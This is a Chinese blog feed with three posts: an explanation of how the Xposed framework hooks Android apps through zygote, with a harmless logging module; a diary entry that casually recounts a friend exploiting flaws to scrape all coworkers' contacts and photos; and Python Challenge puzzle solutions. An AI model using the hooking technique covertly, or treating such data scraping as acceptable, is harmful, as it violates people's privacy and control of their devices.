class="string">"Xposed-Installer-Recovery.zip"</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (installMode == INSTALL_MODE_RECOVERY_MANUAL) &#123;</span><br><span class="line">            <span class="comment">// 手动进入Recovery</span></span><br><span class="line">            <span class="keyword">if</span> (!prepareManualFlash(messages, <span class="string">"Xposed-Installer-Recovery.zip"</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        File blocker = <span class="keyword">new</span> File(XposedApp.BASE_DIR + <span class="string">"conf/disabled"</span>);</span><br><span class="line">        <span class="keyword">if</span> (blocker.exists()) &#123;</span><br><span class="line">            messages.add(getString(R.string.file_removing, blocker.getAbsolutePath()));</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"rm "</span> + blocker.getAbsolutePath(), messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(<span class="string">""</span>);</span><br><span class="line">                messages.add(getString(R.string.file_remove_failed, blocker.getAbsolutePath()));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// copy XposedBridge.jar 到私有目录，XposedBridge.jar是Xposed提供的jar文件，负责在Native层与FrameWork层进行交互</span></span><br><span class="line">        messages.add(getString(R.string.file_copying, <span class="string">"XposedBridge.jar"</span>));</span><br><span class="line">        File jarFile = AssetUtil.writeAssetToFile(<span class="string">"XposedBridge.jar"</span>, <span class="keyword">new</span> File(JAR_PATH_NEWVERSION), <span class="number">00644</span>);</span><br><span class="line">        <span class="keyword">if</span> (jarFile == <span class="keyword">null</span>) &#123;</span><br><span class="line">            messages.add(<span class="string">""</span>);</span><br><span class="line">            messages.add(getString(R.string.file_extract_failed, <span class="string">"XposedBridge.jar"</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="comment">// 将有关文件系统的存储器常驻信息送入物理介质内，在暂停系统之前,比如要重新启动机器,一定要去执行sync命令</span></span><br><span class="line">        mRootUtil.executeWithBusybox(<span class="string">"sync"</span>, messages);</span><br><span class="line"></span><br><span class="line">        showAlert = <span class="keyword">false</span>;</span><br><span class="line">        messages.add(<span class="string">""</span>);</span><br><span class="line">        <span class="keyword">if</span> (installMode == INSTALL_MODE_NORMAL)</span><br><span class="line">            offerReboot(messages);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            offerRebootToRecovery(messages, <span class="string">"Xposed-Installer-Recovery.zip"</span>, installMode);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 删除busybox 工具库</span></span><br><span class="line">        AssetUtil.removeBusybox();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (showAlert)</span><br><span class="line">            showAlert(TextUtils.join(<span class="string">"\n"</span>, messages).trim());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="为什么要替换app_process">为什么要替换app_process</h4><p>在android的源码中的init.rc文件可以看到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">service zygote /system/bin/app_process -Xzygote /system/bin –zygote –start-system-server</span><br><span class="line">socket zygote stream <span class="number">666</span> </span><br><span class="line">onrestart write /sys/android_power/request_state wake</span><br><span class="line">onrestart write /sys/power/state on</span><br><span class="line">onrestart restart media</span><br><span class="line">onrestart restart netd</span><br></pre></td></tr></table></figure>
<p>app_process是andriod app的启动程序，该注入框架通过替换/system/bin/app_process程序控制zygote进程，使得app_process在启动过程中会加载XposedBridge.jar这个jar包，从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持。与采取传统的Inhook方式<a href="http://www.mulliner.org/android/feed/mulliner_dbi_hitb_kul2013.pdf" target="_blank" rel="external">Dynamic Dalvik Instrumentation</a>相比，Xposed在开机的时候完成对所有的Hook Function的劫持，在原Function执行的前后加上自定义代码。</p>
<h4 id="为什么要控制zygote进程">为什么要控制zygote进程</h4><p>在Android系统中，应用程序进程都是由Zygote进程孵化出来的，而Zygote进程是由Init进程启动的。Zygote进程在启动时会创建一个Dalvik虚拟机实例，每当它孵化一个新的应用程序进程时，都会将这个Dalvik虚拟机实例复制到新的应用程序进程里面去，从而使得每一个应用程序进程都有一个独立的Dalvik虚拟机实例。所以如果选择对Zygote进程Hook，则能够达到针对系统上所有的应用程序进程Hook，即一个全局Hook。这也是Xposed选择替换app_process的原因。如下图所示：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-xposed-2.jpg" alt="hook-before-after"></p>
<p>Zygote进程在启动的过程中，除了会创建一个Dalvik虚拟机实例之外，还会将Java运行时库加载到进程中来，以及注册一些Android核心类的JNI方法来前面创建的Dalvik虚拟机实例中去。注意，一个应用程序进程被Zygote进程孵化出来的时候，不仅会获得Zygote进程中的Dalvik虚拟机实例拷贝，还会与Zygote一起共享Java运行时库。这也就是可以将XposedBridge这个jar包加载到每一个Android应用程序中的原因。XposedBridge有一个私有的Native（JNI）方法hookMethodNative，这个方法也在app_process中使用。这个函数提供一个方法对象利用Java的Reflection机制来对内置方法覆写。</p>
<h4 id="Hook/Replace">Hook/Replace</h4><p>Xposed 框架中真正起作用的是对方法的hook。在Repackage技术中，如果要对APK做修改，则需要修改Smali代码中的指令。而另一种动态修改指令的技术需要在程序运行时基于匹配搜索来替换smali代码，但因为方法声明的多样性与复杂性，这种方法也比较复杂。</p>
<p>总结Hook运行过程如下：</p>
<ol>
<li><p>在Android系统启动的时候，zygote进程加载XposedBridge将所有需要替换的Method通过JNI方法hookMethodNative指向Native方法xposedCallHandler，xposedCallHandler在转入handleHookedMethod这个Java方法执行用户规定的Hook Func。</p>
</li>
<li><p>在hookMethodNative的实现中,会调用XposedBridge中的handleHookedMethod这个方法来传递参数;<br>XposedBridge这个jar包含有一个私有的本地方法：hookMethodNative，该方法在附加的app_process程序中也得到了实现。它将一个方法对象作为输入参数（你可以使用Java的反射机制来获取这个方法）并且改变Dalvik虚拟机中对于该方法的定义。它将该方法的类型改变为native并且将这个方法的实现链接到它的本地的通用类的方法。换言之，当调用那个被hook的方法时候，通用的类方法会被调用而不会对调用者有任何的影响。</p>
</li>
<li><p>handleHookedMethod这个方法类似于一个统一调度的Dispatch例程,其对应的底层的C++函数是xposedCallHandler;</p>
</li>
<li><p>handleHookedMethod实现里面会根据一个全局结构hookedMethodCallbacks来选择相应的hook函数,并调用他们的before,after函数;</p>
</li>
<li><p>当多模块同时Hook一个方法的时候，Xposed会自动根据Module的优先级来排序，调用顺序如下：<br>A.before -&gt; B.before -&gt; original method -&gt; B.after -&gt; A.after</p>
</li>
</ol>
<h4 id="Xposed代码分析">Xposed代码分析</h4><p>详见<a href="http://blog.csdn.net/wxyyxc1992/article/details/17320911" target="_blank" rel="external">Android Hook框架Xposed原理与源代码分析</a></p>
<h3 id="Xposed插件编写">Xposed插件编写</h3><p>创建一个插件XposedExample，hook掉系统handleLoadPackage，在系统调用之前打印出加载app的package name，工程用eclipse编写，android studio略有不同。</p>
<p>1.创建一个Blank Activity的android项目</p>
<p>2.工程目录新建lib文件夹，添加文件<a href="http://forum.xda-developers.com/xposed/xposed-api-changelog-developer-news-t2714067" target="_blank" rel="external">XposedBridgeApi-54.jar</a>，然后右键-Build path。</p>
<p>3.修改AndroidManifest.xml，插入xposed元数据。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposedmodule"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"true"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposeddescription"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"Xposed Example"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposedminversion"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"54"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果不想让插件在系统中显示图标，就把activity给注释掉。</p>
<p>4.完整的的AndroidManifest.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="pi">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">manifest</span> <span class="attribute">xmlns:android</span>=<span class="value">"http://schemas.android.com/apk/res/android"</span></span><br><span class="line">    <span class="attribute">package</span>=<span class="value">"com.idhyt.xposedexample"</span></span><br><span class="line">    <span class="attribute">android:versionCode</span>=<span class="value">"1"</span></span><br><span class="line">    <span class="attribute">android:versionName</span>=<span class="value">"1.0"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">uses-sdk</span></span><br><span class="line">        <span class="attribute">android:minSdkVersion</span>=<span class="value">"8"</span></span><br><span class="line">        <span class="attribute">android:targetSdkVersion</span>=<span class="value">"21"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">application</span></span><br><span class="line">        <span class="attribute">android:allowBackup</span>=<span class="value">"true"</span></span><br><span class="line">        <span class="attribute">android:icon</span>=<span class="value">"@drawable/ic_launcher"</span></span><br><span class="line">        <span class="attribute">android:label</span>=<span class="value">"@string/app_name"</span></span><br><span class="line">        <span class="attribute">android:theme</span>=<span class="value">"@style/AppTheme"</span> &gt;</span></span><br><span class="line">        </span><br><span class="line">         <span class="tag">&lt;<span class="title">activity</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">".XposedExample"</span></span><br><span class="line">            <span class="attribute">android:label</span>=<span class="value">"@string/app_name"</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="title">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="title">action</span> <span class="attribute">android:name</span>=<span class="value">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="title">category</span> <span class="attribute">android:name</span>=<span class="value">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="title">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="title">activity</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">        <span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposedmodule"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"true"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposeddescription"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"Xposed Example"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposedminversion"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"54"</span> /&gt;</span> //和XposedBridgeApi-54.jar版本对应</span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="title">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>5.编写插件代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.idhyt.xposedexample;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XposedExample</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(<span class="keyword">final</span> LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        XposedBridge.log(<span class="string">"Loaded app: "</span> + lpparam.packageName);</span><br><span class="line">        XposedBridge.log(<span class="string">"this is a test by idhyt"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>6.在assets文件夹(如果不存在就创建)下新建file写入插件启动入口:<br><code>com.idhyt.xposedexample.XposedExample</code></p>
<p>整个工程目录如下所示:<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-xposed-3e.jpg" alt="project-dir"></p>
<p>7.运行之后 会在虚拟机中看到我们的插件已经安装到xposed模块里边，然后勾选重启系统。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-xposed-4.jpg" alt="install-ok"></p>
<p>8.重启过后，加入过滤规则“loaded app”，在logcat窗口会看到我们的输出日志信息，你打开应用也会显示加载的应用包名。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-xposed-5.jpg" alt="logcat-out"></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="概述">概述</h3><p>Xposed是针对Android平台的动态劫持项目，源码<a href="https://github.com/rovo89" target="_blank" rel="external">github</a></p>
<h4 id="]]>
    </summary>
    
      <category term="xposed" scheme="http://blog.idhyt.xyz/tags/xposed/"/>
    
      <category term="android" scheme="http://blog.idhyt.xyz/categories/android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[生活碎碎念]]></title>
    <link href="http://blog.idhyt.xyz/2015/08/22/1-diary-2015-08-22/"/>
    <id>http://blog.idhyt.xyz/2015/08/22/1-diary-2015-08-22/</id>
    <published>2015-08-22T07:06:11.000Z</published>
    <updated>2015-09-20T14:47:19.000Z</updated>
    <content type="html"><![CDATA[<p>&#160; &#160; &#160; &#160;生活好简单呢，还是生活本来就应该这样，由一些简单的事情组成，做任何事情不期望的那么复杂，吃饭睡觉工作，有人一起也是极好的，没人一起也还是按照自己的想法去做就好。最近最上心的一件事情就是学会了游泳，每晚自己会去游一会，刚开始去的时候跟着里边的小朋友学，有天晚上一个热心的大哥告诉我怎么游，然后试了两个晚上就会了，有时候回来的路上会边走边唱歌，然后四周张望下能不能碰到熟人。<br><a id="more"></a></p>
<p>&#160; &#160; &#160; &#160;简单的生活习惯了，如果有点复杂的事情，自己可能就会不自觉的去抵制，这么久唯一做的感觉有点后悔的事情就是把一个朋友微信给删了，当时有了被忽视的感觉，其实也是有点太过于在乎了。大学毕业后所有朋友的相处方式都是君子之交淡如水的感觉，玩一起的人都是时间轴上的特定事件，没有刻意去经营一些圈子，是这种感觉，不是什么非你不可，而是有你更好。想到了之前微信群里突然正经的讨论了如何定义坏人，我当时说了，只要这个人对我以及我身边的人没有威胁，那我就认为不算是坏人，至于他对于社会的危害，我想我是不能控制的。其实这就是一个没有结果的命题，就相当于每个人定义朋友的方式不同，一个对别人刻薄和不负责人的人，如果对你还ok，你为什么要去否定它？一个对别人还ok，对你总是刻薄的人，你为何要去肯定它？人和人有不同的交集，可能接触的焦点也不同，就简单的去相信它吧。</p>
<p>&#160; &#160; &#160; &#160;这个渔村不知道有什么特殊的灵气，来这边以后就会经常做梦，而且睡眠还不是很好，总是容易半夜醒，而且有点噪声就会惊醒，之前在家和在学校都是一觉睡到大中午，生活从来没上午的，对于噪声，天空掉下五个字，那都不是事，现在可能慢慢习惯这样了，就不会去特别刻意在意这些反而好了很多，晚上先在床上滚一会找个舒服的姿势，然后就能睡着了，不过还是会做梦，梦太多了，我都忘记梦的是什么了，读研时候我记得有次我好不容易做个梦，然后在梦里不知道碰到什么事情了笑了出来，然后笑声把自己惊醒了，宿舍那三个也是各种惊悚。</p>
<p>&#160; &#160; &#160; &#160;想到了前几天有个高中同学突然QQ上加我，我当时以为有什么事情就问了她，她说好多朋友几年没联系了也找不到了，QQ自动推荐的人中看到了我就加了，我当时也是挺有些感慨的聊了几句。然后过了两天，我的QQ空间里的动态全是她卖面膜，化妆品的广告，还加我微信我果断拒绝了，怎么好好的一个人，说推销就推销呢，这种感情绑架真的很讨人烦。经常会看到朋友发借钱不还又不好意思要，要了就是丢掉一个朋友，我也是深有体会，我穷我有理的感觉。为什么我们不能做好朋友，为什么有的人不经常联系了就是陌生人，有些人不经常联系了一点都不疏远，这些想法都是大脑来做出的决定，大脑也是被认为是最聪明的东西，可是你再仔细想想，做出这个判断的却是大脑自己啊，思想真奇妙。</p>
<p>&#160; &#160; &#160; &#160;昨天耗子在群里发了张照片，是我们快毕业时候去四姑娘山玩的时候合照，被挂在了海螺沟的宾馆，感觉还是有点点意外。想想大家那会多欢乐呢，几个人天天在工作室里边写毕业论文边想着怎么玩，周末就一起出去吃个饭看电影，这样的生活也只能在学校才有能去消费，工作之后感觉能玩的朋友越来越少了，大家都有了自己的圈子，铁打的领导和流水的实习生，感觉一切可以认识到新朋友的机会都像是一件奢侈品。</p>
<p>&#160; &#160; &#160; &#160;一个朋友经常在公司碰到一个妹子，是喜欢的类型但又不好意思去主动认识，他写了个爬虫工具利用某些漏洞把整个公司的人的联系方式和照片全爬了下来，放在硬盘里好久也没有去找这个妹子的联系方式，但下次碰到了还是觉得很想去认识，一直到现在都还没有和她有任何交集，好像自己他没有这些资料一样。人或许都有这样一种心态，对一种不可预知结果的事情总是充满了幻想并充满了期待，一旦知道这件事的结果，好像觉得可有可无了并把自己催眠到一种不可预知的状态。</p>
<p>&#160; &#160; &#160; &#160;这一生有很多再见，是再也不见；这一世有很多相遇，是不期而遇。人生的奇妙，只在无常。于千万人之中，遇见你所要遇见的人；于千万年之中，没有早一步，没有晚一步，刚巧赶上了，那也没有别的话可说，只有相视一笑，享受这美好时光。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>&#160; &#160; &#160; &#160;生活好简单呢，还是生活本来就应该这样，由一些简单的事情组成，做任何事情不期望的那么复杂，吃饭睡觉工作，有人一起也是极好的，没人一起也还是按照自己的想法去做就好。最近最上心的一件事情就是学会了游泳，每晚自己会去游一会，刚开始去的时候跟着里边的小朋友学，有天晚上一个热心的大哥告诉我怎么游，然后试了两个晚上就会了，有时候回来的路上会边走边唱歌，然后四周张望下能不能碰到熟人。<br>]]>
    
    </summary>
    
      <category term="diary" scheme="http://blog.idhyt.xyz/tags/diary/"/>
    
      <category term="无法描述" scheme="http://blog.idhyt.xyz/categories/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[python challenge 21-27]]></title>
    <link href="http://blog.idhyt.xyz/2015/08/13/5-python-challenge-21-27/"/>
    <id>http://blog.idhyt.xyz/2015/08/13/5-python-challenge-21-27/</id>
    <published>2015-08-13T13:55:11.000Z</published>
    <updated>2015-12-27T08:54:21.000Z</updated>
    <content type="html"><![CDATA[<p>继续斗智斗勇中。已经开始谷歌大法好了。。</p>
<h3 id="python_challenge_21"><a href="">python challenge 21</a></h3><p><code>invader.zip</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Yes! This is really level 21 in here. &#10;And yes, After you solve it, you&#39;ll be in level 22!&#10;&#10;Now for the level:&#10;&#10;* We used to play this game when we were kids&#10;* When I had no idea what to do, I looked backwards.</span><br></pre></td></tr></table></figure></p>
<p>说这是个小时候的游戏，击鼓传花，国外的玩法不一样，需要一层层地拆传递的那个东西<br>level 20下载到的那个压缩包的package.pack文件是个压缩文件，使用了zlib和bz2两种方式压缩。<br>需要根据上一次解压得到的结果，判断下一次解压用zlib还是bz2，以及判断得到的数据是正向的还是要look backwards。<br>Zlib压缩的数据开头第一个字节是”\x78”,ASCII码是”x”.<br>BZ压缩的数据开头两个字节是”\x42\x7A”,ASCII码是”BZ”.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def package():&#10;    import bz2&#10;    import zlib&#10;&#10;    data = open(&#34;files/invader/package.pack&#34;, &#34;rb+&#34;).read()&#10;    result = []&#10;    while True:&#10;        if data.startswith(&#34;x\x9c&#34;):&#10;            data = zlib.decompress(data)&#10;            result.append(&#34; &#34;)&#10;        elif data.startswith(&#34;BZ&#34;):&#10;            data = bz2.decompress(data)&#10;            result.append(&#34;#&#34;)&#10;        elif data.endswith(&#34;\x9cx&#34;):&#10;            data = data[::-1]&#10;            result.append(&#34;\n&#34;)&#10;        elif data.endswith(&#34;ZB&#34;):&#10;            data = data[::-1]&#10;            result.append(&#34;*&#34;)&#10;        else:&#10;            break&#10;&#10;    print &#34;&#34;.join(result)&#10;&#62;&#62;&#62;&#10;      ###          ###      ########    ########    ##########  ########&#10;    #######      #######    #########   #########   #########   #########&#10;   ##     ##    ##     ##   ##      ##  ##      ##  ##          ##      ##&#10;  ##           ##       ##  ##      ##  ##      ##  ##          ##      ##&#10;  ##           ##       ##  #########   #########   ########    #########&#10;  ##           ##       ##  ########    ########    ########    ######## &#10;  ##           ##       ##  ##          ##          ##          ##   ## &#10;   ##     ##    ##     ##   ##          ##          ##          ##    ## &#10;    #######      #######    ##          ##          #########   ##     ## &#10;      ###          ###      ##          ##          ##########  ##      ##</span><br></pre></td></tr></table></figure></p>
<p>其中四种情况的记录标志符“#\n”等这些可以自己设置，最后将其反转标志替换成回车\n，zlib标志替换成空字符，BZ标志替换成#即可打印出答案。</p>
<h3 id="python_challenge_22"><a href="http://www.pythonchallenge.com/pc/hex/copper.html" target="_blank" rel="external">python challenge 22</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/copper.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-22.jpg" alt="22"><br>查看页面源代码提示：or maybe white.gif would be more bright<br>将copper.html替换为white.gif显示一张黑色图片，黑的什么都看不到。<br>google大法说了每帧图上有一个不同的RGB点。<br>用ps打开，由于是gif动态图只能打开其中一帧，看看RGB全是(0,0,0)，鼠标晃晃就找到了那个不同的RGB(8,8,8)。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-22-white.jpg" alt="22-white"><br>然后我么把这张gif拆帧并将RGB(8,8,8)改为白色RGB(255,255,255),这样就能清晰的看到运动轨迹了。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-22-white-new.gif" alt="22-white-new"><br>如果上图白点不动的话刷新下页面，或者右键图片审查元素，拿到gif图片链接浏览器直接访问。<br>代码整理在github：<a href="https://github.com/idhyt/python_challenge/blob/master/modify_gif.py" target="_blank" rel="external">https://github.com/idhyt/python_challenge/blob/master/modify_gif.py</a><br>看到运动轨迹后思路就很清楚了，该动画总共133帧，白点围绕100,100左右微小变动，<br>联想这一关的图片（一个游戏操纵杆），把这些变动的点连接起来。<br>最后的结果显示通过操纵点的运动一共画出了5个字母的轮廓，所以当白点回归到中心的时候，就是画下一个字母的信号了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def copper():&#10;    from PIL import Image, ImageDraw, ImageSequence&#10;    org_img = Image.open(&#34;img/white.gif&#34;)&#10;    new_img = Image.new(&#39;RGB&#39;, org_img.size, &#34;black&#34;)&#10;    new_img_draw = ImageDraw.Draw(new_img)&#10;    x = 0&#10;    y = 0&#10;    for s in ImageSequence.Iterator(org_img):&#10;        left, upper, right, lower = org_img.getbbox()&#10;        dx = left-100&#10;        dy = upper-100&#10;        x += dx&#10;        y += dy&#10;        if dx == dy == 0:&#10;            x += 20&#10;            y += 30&#10;        new_img_draw.point((x, y))&#10;&#10;    new_img.save(&#34;img/copper.png&#34;)</span><br></pre></td></tr></table></figure></p>
<p>最后生成图片中字母即为level23入口:bonus.html<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-22-copper.png" alt="22-copper"></p>
<h3 id="python_challenge_23"><a href="http://www.pythonchallenge.com/pc/hex/bonus.html" target="_blank" rel="external">python challenge 23</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/bonus.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-23.jpg" alt="23"><br>看网页源码提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">it can&#39;t find it. this is an undocumented module&#10;va gur snpr bs jung?</span><br></pre></td></tr></table></figure></p>
<p>va gur snpr bs jung?这段字符串想到了第二关的移位，由于不知道移几位，因此做个枚举<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bonus</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">shift</span><span class="params">(str_value, shift_num)</span>:</span></span><br><span class="line">        ret_list = []</span><br><span class="line">        alphas = list(str_value)</span><br><span class="line">        <span class="keyword">for</span> alpha <span class="keyword">in</span> alphas:</span><br><span class="line">            temp_ord = ord(alpha) + shift_num</span><br><span class="line">            <span class="keyword">if</span> <span class="number">97</span> &lt;= temp_ord &lt;= <span class="number">122</span>:</span><br><span class="line">                ret_list.append(chr(temp_ord))</span><br><span class="line">            <span class="keyword">elif</span> temp_ord &gt; <span class="number">122</span>:</span><br><span class="line">                ret_list.append(chr(temp_ord - <span class="number">122</span> + <span class="number">96</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ret_list.append(<span class="string">" "</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>.join(ret_list)</span><br><span class="line"></span><br><span class="line">    org_str = <span class="string">"va gur snpr bs jung"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">26</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&gt;&gt;%d -&gt; %s"</span> % (i, shift(org_str, i))</span><br></pre></td></tr></table></figure></p>
<p>看输出信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#62;&#62;1 -&#62; wb hvs toqs ct kvoh&#10;&#62;&#62;2 -&#62; xc iwt uprt du lwpi&#10;&#62;&#62;3 -&#62; yd jxu vqsu ev mxqj&#10;&#62;&#62;4 -&#62; ze kyv wrtv fw nyrk&#10;&#62;&#62;5 -&#62; af lzw xsuw gx ozsl&#10;&#62;&#62;6 -&#62; bg max ytvx hy patm&#10;&#62;&#62;7 -&#62; ch nby zuwy iz qbun&#10;&#62;&#62;8 -&#62; di ocz avxz ja rcvo&#10;&#62;&#62;9 -&#62; ej pda bwya kb sdwp&#10;&#62;&#62;10 -&#62; fk qeb cxzb lc texq&#10;&#62;&#62;11 -&#62; gl rfc dyac md ufyr&#10;&#62;&#62;12 -&#62; hm sgd ezbd ne vgzs&#10;&#62;&#62;13 -&#62; in the face of what&#10;&#62;&#62;14 -&#62; jo uif gbdf pg xibu&#10;&#62;&#62;15 -&#62; kp vjg hceg qh yjcv&#10;&#62;&#62;16 -&#62; lq wkh idfh ri zkdw&#10;&#62;&#62;17 -&#62; mr xli jegi sj alex&#10;...</span><br></pre></td></tr></table></figure></p>
